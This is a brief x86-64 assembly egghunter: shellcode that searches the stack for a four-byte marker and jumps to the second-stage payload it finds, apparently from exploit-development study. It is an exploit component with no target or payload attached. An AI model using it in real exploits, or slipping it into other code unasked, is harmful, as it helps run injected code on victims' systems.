BITS 64

global _start

section .text

_start:
    mov rcx, rsp    ; use top of the stack as our search start address
    add rcx, 20     ; otherwise the egghunter finds itself

continue:
    inc rcx         ; use inc/dec depending where on the stack the stage 2 payload is located
    cmp dword [rcx], 0x48934893 ; compare with egg
    jne continue

discovered:
    jmp rcx         ; egg is found, pass execution to it